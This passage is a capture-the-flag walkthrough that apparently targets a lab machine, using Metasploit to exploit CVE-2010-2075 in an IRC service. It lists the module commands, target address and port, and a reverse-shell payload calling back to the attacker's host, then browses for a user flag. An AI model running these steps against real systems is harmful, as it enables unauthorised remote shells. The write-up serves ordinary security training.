We have identified that we are dealing with CVE-2010-2075, so we are going to use Metasploit to exploit this vulnerability.
```bash
$ msfconsole
```

![alt text](Images/Metasploit.png)
```bash
$ search CVE-2010-2075
$ use 0
$ options
```

![alt text](Images/Metasploit2.png)
```bash
$ set RHOST 10.129.1.176
$ set RPORT 6697
```

![alt text](Images/Metasploit3.png)
```bash
$ exploit
```
If we do this, metasploit return us a error saying that we need a payload, so:
```bash
$ set PAYLOAD cmd/unix/reverse
```
![alt text](Images/Metasploit4.png)

And now we set the new otpions
```bash
$ set LHOST tun0
$ set LPORT 443
```

![alt text](Images/Metasploit5.png)
```bash
$ run
```
![alt text](Images/Metasploit6.png)

While browsing through the directories, we found a user named "djmardov" who contains the user flag, but we do not have permission to view it.

![alt text](Images/Metasploit7.png)




[Back](README.md)